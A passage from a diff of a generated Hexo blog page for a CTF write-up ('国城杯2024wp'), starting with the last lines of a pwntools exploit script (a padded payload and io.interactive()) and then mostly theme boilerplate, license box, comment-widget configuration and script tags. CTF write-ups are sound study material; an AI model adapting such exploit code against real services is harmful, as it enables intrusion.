class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span>+payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>国城杯2024wp</div>
+      <div>https://powchan.github.io.git/2024/12/07/国城杯2024wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>powchan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/16/ISCTFwp/" title="ISCTFwp">
+                        <span class="hidden-mobile">ISCTFwp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"E9J51HCohMjoDZnVnUL7K6HQ-MdYXbMMI","appKey":"OBkWl3JVMi6xvf0fakr13PWG","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://e9j51hco.api.lncldglobal.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
